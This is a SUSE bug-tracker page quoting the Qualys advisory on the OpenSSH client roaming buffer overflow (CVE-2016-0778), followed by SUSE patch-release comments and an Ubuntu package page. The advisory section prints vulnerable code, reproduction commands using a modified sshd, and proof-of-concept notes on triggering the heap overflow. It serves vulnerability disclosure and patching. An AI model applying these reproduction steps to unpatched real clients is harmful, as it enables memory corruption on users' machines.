262                 if (ssh_connect(host, &hostaddr, options.port, ... 265                     options.proxy_command) == 0 && roaming_resume() == 0) { 266                         packet_restore_state(); ... 268                         fprintf(stderr, "[connection resumed]\n"); ... 270                         return 0; 271                 } 272 273                 fprintf(stderr, "[reconnect failed, press return to retry]"); ... 275         } 276         fprintf(stderr, "[exiting]\n"); ... 278         exit(0); 279 }  1. packet_backup_state() close()s connection_in and connection_out (the old file descriptors that connected the client to the server), and saves the state of the suspended SSH session (for example, the encryption and decryption contexts).  2. ssh_connect() opens new file descriptors, and connects them to the SSH server.  3. roaming_resume() negotiates the resumption of the suspended SSH session with the server, and calls resend_bytes().  4. packet_restore_state() updates connection_in and connection_out (with the new file descriptors that connect the client to the server), and restores the state of the suspended SSH session.  The new file descriptors for connection_in and connection_out may differ from the old ones (if, for example, files or pipes or sockets are opened or closed between two successive ssh_connect() calls), but unfortunately historical code in OpenSSH assumes that they are constant:  - In client_loop(), the variables connection_in and connection_out are   cached locally, but packet_write_poll() calls roaming_write(), which   may assign new values to connection_in and connection_out (if a   reconnection occurs), and client_wait_until_can_do_something()   subsequently reuses the old, cached values.  - client_loop() eventually updates these cached values, and the   following FD_ISSET() uses a new, updated file descriptor (the fd   connection_out), but an old, out-of-date file descriptor set (the   fd_set writeset).  - packet_read_seqnr() (old API, or ssh_packet_read_seqnr(), new API)   first calloc()ates setp, a file descriptor set for connection_in;   next, it loops around memset(), FD_SET(), select() and roaming_read();   last, it free()s setp and returns. Unfortunately, roaming_read() may   reassign a higher value to connection_in (if a reconnection occurs),   but setp is never enlarged, and the following memset() and FD_SET()   may therefore overflow setp (a heap-based buffer overflow):  1048 int 1049 packet_read_seqnr(u_int32_t *seqnr_p) 1050 { .... 1052         fd_set *setp; .... 1058         setp = (fd_set *)xcalloc(howmany(active_state->connection_in + 1, 1059             NFDBITS), sizeof(fd_mask)); .... 1065         for (;;) { .... 1075                 if (type != SSH_MSG_NONE) { 1076                         free(setp); 1077                         return type; 1078                 } .... 1083                 memset(setp, 0, howmany(active_state->connection_in + 1, 1084                     NFDBITS) * sizeof(fd_mask)); 1085                 FD_SET(active_state->connection_in, setp); .... 1092                 for (;;) { .... 1097                         if ((ret = select(active_state->connection_in + 1, setp, 1098                             NULL, NULL, timeoutp)) >= 0) 1099                                 break; .... 1115                 } .... 1117                 do { .... 1119                         len = roaming_read(active_state->connection_in, buf, 1120                             sizeof(buf), &cont); 1121                 } while (len == 0 && cont); .... 1130         } 1131         /* NOTREACHED */ 1132 }  - packet_write_wait() (old API, or ssh_packet_write_wait(), new API) is   basically similar to packet_read_seqnr() and may overflow its own setp   if roaming_write() (called by packet_write_poll()) reassigns a higher   value to connection_out (after a successful reconnection):  1739 void 1740 packet_write_wait(void) 1741 { 1742         fd_set *setp; .... 1746         setp = (fd_set *)xcalloc(howmany(active_state->connection_out + 1, 1747             NFDBITS), sizeof(fd_mask)); 1748         packet_write_poll(); 1749         while (packet_have_data_to_write()) { 1750                 memset(setp, 0, howmany(active_state->connection_out + 1, 1751                     NFDBITS) * sizeof(fd_mask)); 1752                 FD_SET(active_state->connection_out, setp); .... 1758                 for (;;) { .... 1763                         if ((ret = select(active_state->connection_out + 1, 1764                             NULL, setp, NULL, timeoutp)) >= 0) 1765                                 break; .... 1776                 } .... 1782                 packet_write_poll(); 1783         } 1784         free(setp); 1785 }  ------------------------------------------------------------------------ Mitigating Factors ------------------------------------------------------------------------  This buffer overflow affects all OpenSSH clients >= 5.4, but its impact is significantly reduced by the Mitigating Factors detailed in the Information Leak section, and additionally:  - OpenSSH versions >= 6.8 reimplement packet_backup_state() and   packet_restore_state(), but introduce a bug that prevents the buffer   overflow from being exploited; indeed, ssh_packet_backup_state() swaps   two local pointers, ssh and backup_state, instead of swapping the two   global pointers active_state and backup_state:    9 struct ssh *active_state, *backup_state; ... 238 void 239 packet_backup_state(void) 240 { 241         ssh_packet_backup_state(active_state, backup_state); 242 } 243 244 void 245 packet_restore_state(void) 246 { 247         ssh_packet_restore_state(active_state, backup_state); 248 }  2269 void 2270 ssh_packet_backup_state(struct ssh *ssh, 2271     struct ssh *backup_state) 2272 { 2273         struct ssh *tmp; .... 2279         if (backup_state) 2280                 tmp = backup_state; 2281         else 2282                 tmp = ssh_alloc_session_state(); 2283         backup_state = ssh; 2284         ssh = tmp; 2285 } .... 2291 void 2292 ssh_packet_restore_state(struct ssh *ssh, 2293     struct ssh *backup_state) 2294 { 2295         struct ssh *tmp; .... 2299         tmp = backup_state; 2300         backup_state = ssh; 2301         ssh = tmp; 2302         ssh->state->connection_in = backup_state->state->connection_in;    As a result, the global pointer backup_state is still NULL when passed   to ssh_packet_restore_state(), and crashes the OpenSSH client when   dereferenced:  # env ROAMING="overflow:A fd_leaks:0" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -V OpenSSH_6.8, LibreSSL 2.1  $ /usr/bin/ssh -o ProxyCommand="/usr/bin/nc -w 15 %h %p" -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume]Segmentation fault (core dumped)    This bug prevents the buffer overflow from being exploited, but not   the information leak, because the vulnerable function resend_bytes()   is called before ssh_packet_restore_state() crashes.  - To the best of our knowledge, this buffer overflow is not exploitable   in the default configuration of the OpenSSH client; the conclusion of   the File Descriptor Leak section suggests that two non-default options   are required: a ProxyCommand, and either ForwardAgent (-A) or   ForwardX11 (-X).  ------------------------------------------------------------------------ File Descriptor Leak ------------------------------------------------------------------------  A back-of-the-envelope calculation indicates that, in order to increase the file descriptor connection_in or connection_out, and thus overflow the file descriptor set setp in packet_read_seqnr() or packet_write_wait(), a file descriptor leak is needed:  - First, the number of bytes calloc()ated for setp is rounded up to the   nearest multiple of sizeof(fd_mask): 8 bytes (or 64 file descriptors)   on 64-bit systems.  - Next, in glibc, this number is rounded up to the nearest multiple of   MALLOC_ALIGNMENT: 16 bytes (or 128 file descriptors) on 64-bit   systems.  - Last, in glibc, a MIN_CHUNK_SIZE is enforced: 32 bytes on 64-bit   systems, of which 24 bytes (or 192 file descriptors) are reserved for   setp.  - In conclusion, a file descriptor leak is needed, because connection_in   or connection_out has to be increased by hundreds in order to overflow   setp.  The search for a suitable file descriptor leak begins with a study of the behavior of the four ssh_connect() methods, when called for a reconnection by wait_for_roaming_reconnect():  1. The default method ssh_connect_direct() communicates with the server through a simple TCP socket: the two file descriptors connection_in and connection_out are both equal to this socket's file descriptor.  In wait_for_roaming_reconnect(), the low-numbered file descriptor of the old TCP socket is close()d by packet_backup_state(), but immediately reused for the new TCP socket in ssh_connect_direct(): the new file descriptors connection_in and connection_out are equal to this old, low-numbered file descriptor, and cannot possibly overflow setp.  2. The special ProxyCommand "-" communicates with the server through stdin and stdout, but (as explained in the Mitigating Factors of the Information Leak section) it cannot possibly reconnect to the server, and is therefore immune to this buffer overflow.  3. Surprisingly, we discovered a file descriptor leak in the ssh_proxy_fdpass_connect() method itself; indeed, the file descriptor sp[1] is never close()d:   101 static int  102 ssh_proxy_fdpass_connect(const char *host, u_short port,  103     const char *proxy_command)  104 {  ...  106         int sp[2], sock;  ...  113         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) < 0)  114                 fatal("Could not create socketpair to communicate with "  115                     "proxy dialer: %.100s", strerror(errno));  ...  161         close(sp[0]);  ...  164         if ((sock = mm_receive_fd(sp[1])) == -1)  165                 fatal("proxy dialer did not pass back a connection");  ...  171         /* Set the connection file descriptors. */  172         packet_set_connection(sock, sock);  173  174         return 0;  175 }  However, two different reasons prevent this file descriptor leak from triggering the setp overflow:  - The method ssh_proxy_fdpass_connect() communicates with the server   through a single socket received from the ProxyCommand: the two file   descriptors connection_in and connection_out are both equal to this   socket's file descriptor.    In wait_for_roaming_reconnect(), the low-numbered file descriptor of   the old socket is close()d by packet_backup_state(), reused for sp[0]   in ssh_proxy_fdpass_connect(), close()d again, and eventually reused   again for the new socket: the new file descriptors connection_in and   connection_out are equal to this old, low-numbered file descriptor,   and cannot possibly overflow setp.  - Because of the waitpid() bug described in the Mitigating Factors of   the Information Leak section, the method ssh_proxy_fdpass_connect()   calls fatal() before it returns to wait_for_roaming_reconnect(), and   is therefore immune to this buffer overflow.  4. The method ssh_proxy_connect() communicates with the server through a ProxyCommand and two different pipes: the file descriptor connection_in is the read end of the second pipe (pout[0]), and the file descriptor connection_out is the write end of the first pipe (pin[1]):   180 static int  181 ssh_proxy_connect(const char *host, u_short port, const char *proxy_command)  182 {  ...  184         int pin[2], pout[2];  ...  192         if (pipe(pin) < 0 || pipe(pout) < 0)  193                 fatal("Could not create pipes to communicate with the proxy: %.100s",  194                     strerror(errno));  ...  240         /* Close child side of the descriptors. */  241         close(pin[0]);  242         close(pout[1]);  ...  247         /* Set the connection file descriptors. */  248         packet_set_connection(pout[0], pin[1]);  249  250         /* Indicate OK return */  251         return 0;  252 }  In wait_for_roaming_reconnect(), the two old, low-numbered file descriptors connection_in and connection_out are both close()d by packet_backup_state(), and immediately reused for the pipe(pin) in ssh_proxy_connect(): the new connection_out (pin[1]) is equal to one of these old, low-numbered file descriptors, and cannot possibly overflow setp.  On the other hand, the pipe(pout) in ssh_proxy_connect() may return high-numbered file descriptors, and the new connection_in (pout[0]) may therefore overflow setp, if hundreds of file descriptors were leaked before the call to wait_for_roaming_reconnect():  - We discovered a file descriptor leak in the pubkey_prepare() function   of OpenSSH >= 6.8; indeed, if the client is running an authentication   agent that does not offer any private keys, the reference to agent_fd   is lost, and this file descriptor is never close()d:  1194 static void 1195 pubkey_prepare(Authctxt *authctxt) 1196 { .... 1200         int agent_fd, i, r, found; .... 1247         if ((r = ssh_get_authentication_socket(&agent_fd)) != 0) { 1248                 if (r != SSH_ERR_AGENT_NOT_PRESENT) 1249                         debug("%s: ssh_get_authentication_socket: %s", 1250                             __func__, ssh_err(r)); 1251         } else if ((r = ssh_fetch_identitylist(agent_fd, 2, &idlist)) != 0) { 1252                 if (r != SSH_ERR_AGENT_NO_IDENTITIES) 1253                         debug("%s: ssh_fetch_identitylist: %s", 1254                             __func__, ssh_err(r)); 1255         } else { .... 1288                 authctxt->agent_fd = agent_fd; 1289         } .... 1299 }    However, OpenSSH clients >= 6.8 crash in ssh_packet_restore_state()   (because of the NULL-pointer dereference discussed in the Mitigating   Factors of the Buffer Overflow section) and are immune to the setp   overflow, despite this agent_fd leak.  - If ForwardAgent (-A) or ForwardX11 (-X) is enabled in the OpenSSH   client (it is disabled by default), a malicious SSH server can request   hundreds of forwardings, in order to increase connection_in (each   forwarding opens a file descriptor), and thus overflow setp in   packet_read_seqnr():  # env ROAMING="overflow:A" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -V OpenSSH_6.6.1p1 Ubuntu-2ubuntu2, OpenSSL 1.0.1f 6 Jan 2014  $ /usr/bin/ssh-agent -- /usr/bin/ssh -A -o ProxyCommand="/usr/bin/socat - TCP4:%h:%p" -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume][connection resumed] *** Error in `/usr/bin/ssh': free(): invalid next size (fast): 0x00007f0474d03e70 *** Aborted (core dumped)  # env ROAMING="overflow:X" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -V OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013  $ /usr/bin/ssh -X -o ProxyCommand="/usr/bin/socat - TCP4:%h:%p" -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume][connection resumed] *** Error in `/usr/bin/ssh': free(): invalid next size (fast): 0x00007fdcc2a3aba0 *** *** Error in `/usr/bin/ssh': malloc(): memory corruption: 0x00007fdcc2a3abc0 ***  Finally, a brief digression on two unexpected problems that had to be solved in our proof-of-concept:  - First, setp can be overflowed only in packet_read_seqnr(), not in   packet_write_wait(), but agent forwarding and X11 forwarding are post-   authentication functionalities, and post-authentication calls to   packet_read() or packet_read_expect() are scarce, except in the   key-exchange code of OpenSSH clients < 6.8: our proof-of-concept   effectively forces a rekeying in order to overflow setp in   packet_read_seqnr().  - Second, after a successful reconnection, packet_read_seqnr() may call   fatal("Read from socket failed: %.100s", ...), because roaming_read()   may return EAGAIN (EAGAIN is never returned without the reconnection,   because the preceding call to select() guarantees that connection_in   is ready for read()). Our proof-of-concept works around this problem   by forcing the client to resend MAX_ROAMBUF bytes (2M) to the server,   allowing data to reach the client before roaming_read() is called,   thus avoiding EAGAIN. ``` [Comment 1](show_bug.cgi?id=961645#c1)  Johannes Segitz   2016-01-13 09:12:59 UTC  ``` CRD: 2016-01-14 9:00 AM PST ``` [Comment 2](show_bug.cgi?id=961645#c2)  Johannes Segitz   2016-01-13 12:06:18 UTC  ``` The reproducer in [bsc#961642](http://bugzilla.suse.com/show_bug.cgi?id=961642) should be ``` [Comment 3](show_bug.cgi?id=961645#c3)  Andreas Stieger   2016-01-13 15:55:23 UTC  ``` QA hint for verifying the roaming feature is wiped:  Affected client in default config: > debug1: Roaming not allowed by server  Original client, when run with "-oUseRoaming=no" or  'UseRoaming no' in ssh_config or ~/.ssh/config will not print this.  Expected behavior for the fixed client: Never print this, even when -oUseRoaming=yes is specified or 'UseRoaming yes' is in ssh_config or ~/.ssh/config. ``` [Comment 7](show_bug.cgi?id=961645#c7)  Johannes Segitz   2016-01-14 08:16:06 UTC  ``` Created [attachment 661721](attachment.cgi?id=661721&action=diff "Final upstream patch") [[details]](attachment.cgi?id=661721&action=edit "Final upstream patch") Final upstream patch ``` [Comment 10](show_bug.cgi?id=961645#c10)  Bernhard Wiedemann   2016-01-14 17:00:15 UTC  ``` This is an autogenerated message for OBS integration: This bug (961645) was mentioned in <https://build.opensuse.org/request/show/353722> 13.2 / openssh ``` [Comment 11](show_bug.cgi?id=961645#c11)  Johannes Segitz   2016-01-14 17:21:58 UTC  ``` Official advisory by Qualys: <https://www.qualys.com/2016/01/14/cve-2016-0777-cve-2016-0778/openssh-cve-2016-0777-cve-2016-0778.txt>  SUSE would like to thank Qualys for the detailed report. ``` [Comment 12](show_bug.cgi?id=961645#c12)  Swamp Workflow Management   2016-01-14 19:11:56 UTC  ``` SUSE-SU-2016:0117-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server 11-SECURITY (src):    openssh-openssl1-6.6p1-10.1 ``` [Comment 13](show_bug.cgi?id=961645#c13)  Swamp Workflow Management   2016-01-14 19:12:32 UTC  ``` SUSE-SU-2016:0118-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server 12-SP1 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 SUSE Linux Enterprise Server 12 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 SUSE Linux Enterprise Desktop 12-SP1 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 SUSE Linux Enterprise Desktop 12 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 ``` [Comment 14](show_bug.cgi?id=961645#c14)  Swamp Workflow Management   2016-01-14 19:13:10 UTC  ``` SUSE-SU-2016:0119-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server for VMWare 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 SUSE Linux Enterprise Server 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 SUSE Linux Enterprise Desktop 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 SUSE Linux Enterprise Debuginfo 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 ``` [Comment 15](show_bug.cgi?id=961645#c15)  Swamp Workflow Management   2016-01-14 19:13:49 UTC  ``` SUSE-SU-2016:0120-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server 11-SP4 (src):    openssh-6.6p1-16.1, openssh-askpass-gnome-6.6p1-16.4 SUSE Linux Enterprise Desktop 11-SP4 (src):    openssh-6.6p1-16.1, openssh-askpass-gnome-6.6p1-16.4 SUSE Linux Enterprise Debuginfo 11-SP4 (src):    openssh-6.6p1-16.1, openssh-askpass-gnome-6.6p1-16.4 ``` [Comment 16](show_bug.cgi?id=961645#c16)  Haral Tsitsivas   2016-01-14 22:09:05 UTC  ``` Requesting patch for SLES11SP1 LTSS. ``` [Comment 17](show_bug.cgi?id=961645#c17)  Andreas Stieger   2016-01-14 22:12:52 UTC  ``` (In reply to Haral Tsitsivas from [comment #16](show_bug.cgi?id=961645#c16)) > Requesting patch for SLES11SP1 LTSS.  Not affected. ``` [Comment 18](show_bug.cgi?id=961645#c18)  Andreas Stieger   2016-01-14 22:40:39 UTC  ``` Releasing openSUSE updates, resolving as fixed. ``` [Comment 19](show_bug.cgi?id=961645#c19)  Swamp Workflow Management   2016-01-15 02:11:35 UTC  ``` openSUSE-SU-2016:0127-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE 13.2 (src):    openssh-6.6p1-5.3.1, openssh-askpass-gnome-6.6p1-5.3.1 ``` [Comment 20](show_bug.cgi?id=961645#c20)  Swamp Workflow Management   2016-01-15 02:12:07 UTC  ``` openSUSE-SU-2016:0128-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE Leap 42.1 (src):    openssh-6.6p1-8.1, openssh-askpass-gnome-6.6p1-8.1 ``` [Comment 21](show_bug.cgi?id=961645#c21)  Bernhard Wiedemann   2016-01-15 08:00:20 UTC  ``` This is an autogenerated message for OBS integration: This bug (961645) was mentioned in <https://build.opensuse.org/request/show/353786> 13.1 / openssh ``` [Comment 22](show_bug.cgi?id=961645#c22)  Bernhard Wiedemann   2016-01-15 12:00:18 UTC  ``` This is an autogenerated message for OBS integration: This bug (961645) was mentioned in <https://build.opensuse.org/request/show/353827> Evergreen:11.4+13.1 / openssh ``` [Comment 23](show_bug.cgi?id=961645#c23)  Bernhard Wiedemann   2016-01-15 13:00:16 UTC  ``` This is an autogenerated message for OBS integration: This bug (961645) was mentioned in <https://build.opensuse.org/request/show/353838> Evergreen:11.4 / openssh ``` [Comment 24](show_bug.cgi?id=961645#c24)  Swamp Workflow Management   2016-01-16 02:11:30 UTC  ``` openSUSE-SU-2016:0144-1: An update that fixes three vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-077,CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE Evergreen 11.4 (src):    openssh-5.8p1-11.1, openssh-askpass-gnome-5.8p1-11.1 ``` [Comment 25](show_bug.cgi?id=961645#c25)  Swamp Workflow Management   2016-01-16 02:11:58 UTC  ``` openSUSE-SU-2016:0145-1: An update that fixes three vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-077,CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE 13.1 (src):    openssh-6.2p2-3.7.1, openssh-askpass-gnome-6.2p2-3.7.1 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=961645)
* - [XML](show_bug.cgi?ctype=xml&id=961645)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=961645)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D961645)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from launchpad.net_e3b59cdc_20250126_125211.html ===

[Log in / Register](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A5.9p1-5ubuntu1.8/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[openssh package](https://launchpad.net/ubuntu/%2Bsource/openssh)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/openssh)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/openssh)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/openssh)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/openssh)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/openssh)

# openssh 1:5.9p1-5ubuntu1.8 source package in Ubuntu

## Changelog

```
openssh (1:5.9p1-5ubuntu1.8) precise-security; urgency=medium

  * SECURITY UPDATE: information leak and overflow in roaming support
    - debian/patches/CVE-2016-077x.patch: completely disable roaming option
      in readconf.c.
    - CVE-2016-0777
    - CVE-2016-0778

 -- Marc Deslauriers <email address hidden>  Wed, 13 Jan 2016 10:49:17 -0500
```

## Upload details

Uploaded by:
[Marc Deslauriers](/~mdeslaur)
on 2016-01-13

Uploaded to:
[Precise](/ubuntu/precise)

Original maintainer:
[Colin Watson](/~cjwatson)

Architectures:
any all

Section:
net

Urgency:
Medium Urgency

## [See full publishing history](%2Bpublishinghistory) Publishing

| Series | Pocket | Published | Component | Section |
| --- | --- | --- | --- | --- |

## Builds

[Precise](/ubuntu/precise):
![[FULLYBUILT]](/@@/build-success "Successfully built")
[amd64](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/8843288)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[armel](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/8843289)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[armhf](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/8843290)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[i386](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/8843291)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[powerpc](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/8843292)

## Downloads

| File | Size | SHA-256 Checksum |
| --- | --- | --- |
| [openssh\_5.9p1.orig.tar.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/openssh/1%3A5.9p1-5ubuntu1.8/openssh_5.9p1.orig.tar.gz) | 1.1 MiB | 8d3e8b6b6ff04b525a6dfa6fdeb6a99043ccf6c3310cc32eba84c939b07777d5 |
| [openssh\_5.9p1-5ubuntu1.8.debian.tar.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/openssh/1%3A5.9p1-5ubuntu1.8/openssh_5.9p1-5ubuntu1.8.debian.tar.gz) | 251.3 KiB | bb8d68210ae07e18aee3dc6b17ad1e41d558a12db8c9121739b93815fe1d5189 |
| [openssh\_5.9p1-5ubuntu1.8.dsc](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/openssh/1%3A5.9p1-5ubuntu1.8/openssh_5.9p1-5ubuntu1.8.dsc) | 2.5 KiB | 5503ca968e86a32fe89d12d66af08a724ccde25581ad312a509ecce1049fde18 |

### Available diffs

* [diff from 1:5.9p1-5ubuntu1.7 (in ~ubuntu-security-proposed/ubuntu/ppa) to 1:5.9p1-5ubuntu1.8](http://launchpadlibrarian.net/234148616/openssh_1%3A5.9p1-5ubuntu1.7_1%3A5.9p1-5ubuntu1.8.diff.gz) (846 bytes)
* [diff from 1:5.9p1-5ubuntu1.3 to 1:5.9p1-5ubuntu1.8](http://launchpadlibrarian.net/234047568/openssh_1%3A5.9p1-5ubuntu1.3_1%3A5.9p1-5ubuntu1.8.diff.gz) (4.8 KiB)

[View changes file](http://launchpadlibrarian.net/234047293/openssh_5.9p1-5ubuntu1.8_source.changes)

## Binary packages built by this source

[openssh-client](/ubuntu/precise/%2Bpackage/openssh-client):
secure shell (SSH) client, for secure access to remote machines

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 Ssh (Secure Shell) is a program for logging into a remote machine

 and for executing commands on a remote machine.

 It provides secure encrypted communications between two untrusted

 hosts over an insecure network. X11 connections and arbitrary TCP/IP

 ports can also be forwarded over the secure channel.

 It can be used to provide applications with a secure communication

 channel.

 .

 This package provides the ssh, scp and sftp clients, the ssh-agent

 and ssh-add programs to make public key authentication more convenient,

 and the ssh-keygen, ssh-keyscan, ssh-copy-id and ssh-argv0 utilities.

 .

 In some countries it may be illegal to use any encryption at all

 without a special permit.

 .

 ssh replaces the insecure rsh, rcp and rlogin programs, which are

 obsolete for most purposes.

[openssh-client-dbgsym](/ubuntu/precise/%2Bpackage/openssh-client-dbgsym):
debug symbols for package openssh-client

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 Ssh (Secure Shell) is a program for logging into a remote machine

 and for executing commands on a remote machine.

 It provides secure encrypted communications between two untrusted

 hosts over an insecure network. X11 connections and arbitrary TCP/IP

 ports can also be forwarded over the secure channel.

 It can be used to provide applications with a secure communication

 channel.

 .

 This package provides the ssh, scp and sftp clients, the ssh-agent

 and ssh-add programs to make public key authentication more convenient,

 and the ssh-keygen, ssh-keyscan, ssh-copy-id and ssh-argv0 utilities.

 .

 In some countries it may be illegal to use any encryption at all

 without a special permit.

 .

 ssh replaces the insecure rsh, rcp and rlogin programs, which are

 obsolete for most purposes.

[openssh-client-udeb](/ubuntu/precise/%2Bpackage/openssh-client-udeb):
secure shell client for the Debian installer

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 This package provides the ssh client for use in debian-installer.

[openssh-client-udeb-dbgsym](/ubuntu/precise/%2Bpackage/openssh-client-udeb-dbgsym):
debug symbols for package openssh-client-udeb

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 This package provides the ssh client for use in debian-installer.

[openssh-server](/ubuntu/precise/%2Bpackage/openssh-server):
secure shell (SSH) server, for secure access from remote machines

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 Ssh (Secure Shell) is a program for logging into a remote machine

 and for executing commands on a remote machine.

 It provides secure encrypted communications between two untrusted

 hosts over an insecure network. X11 connections and arbitrary TCP/IP

 ports can also be forwarded over the secure channel.

 It can be used to provide applications with a secure communication

 channel.

 .

 This package provides the sshd server.

 .

 In some countries it may be illegal to use any encryption at all

 without a special permit.

 .

 sshd replaces the insecure rshd program, which is obsolete for most

 purposes.

[openssh-server-dbgsym](/ubuntu/precise/%2Bpackage/openssh-server-dbgsym):
debug symbols for package openssh-server

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 Ssh (Secure Shell) is a program for logging into a remote machine

 and for executing commands on a remote machine.

 It provides secure encrypted communications between two untrusted

 hosts over an insecure network. X11 connections and arbitrary TCP/IP

 ports can also be forwarded over the secure channel.

 It can be used to provide applications with a secure communication

 channel.

 .

 This package provides the sshd server.

 .

 In some countries it may be illegal to use any encryption at all

 without a special permit.

 .

 sshd replaces the insecure rshd program, which is obsolete for most

 purposes.

[openssh-server-udeb](/ubuntu/precise/%2Bpackage/openssh-server-udeb):
secure shell server for the Debian installer

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 This package provides the sshd server for use in debian-installer.

 Since it is expected to be used in specialized situations (e.g. S/390

 installs with no console), it does not provide any configuration.

[openssh-server-udeb-dbgsym](/ubuntu/precise/%2Bpackage/openssh-server-udeb-dbgsym):
debug symbols for package openssh-server-udeb

This is the portable version of OpenSSH, a free implementation of

 the Secure Shell protocol as specified by the IETF secsh working

 group.

 .

 This package provides the sshd server for use in debian-installer.

 Since it is expected to be used in specialized situations (e.g. S/390

 installs with no console), it does not provide any configuration.

[ssh](/ubuntu/precise/%2Bpackage/ssh):
secure shell client and server (metapackage)

This metapackage is a convenient way to install both the OpenSSH client

 and the OpenSSH server. It provides nothing in and of itself, so you

 may remove it if nothing depends on it.

[ssh-askpass-gnome](/ubuntu/precise/%2Bpackage/ssh-askpass-gnome):
interactive X program to prompt users for a passphrase for ssh-add

This has been split out of the main openssh-client package so that

 openssh-client does not need to depend on GTK+.

 .

 You probably want the ssh-askpass package instead, but this is

 provided to add to your choice and/or confusion.

[ssh-askpass-gnome-dbgsym](/ubuntu/precise/%2Bpackage/ssh-askpass-gnome-dbgsym):
debug symbols for package ssh-askpass-gnome

This has been split out of the main openssh-client package so that

 openssh-client does not need to depend on GTK+.

 .

 You probably want the ssh-askpass package instead, but this is

 provided to add to your choice and/or confusion.

[ssh-krb5](/ubuntu/precise/%2Bpackage/ssh-krb5):
secure shell client and server (transitional package)

This is a transitional package depending on the regular Debian OpenSSH

 client and server, which now support GSSAPI natively. It will add the

 necessary GSSAPI options to the server configuration file. You can

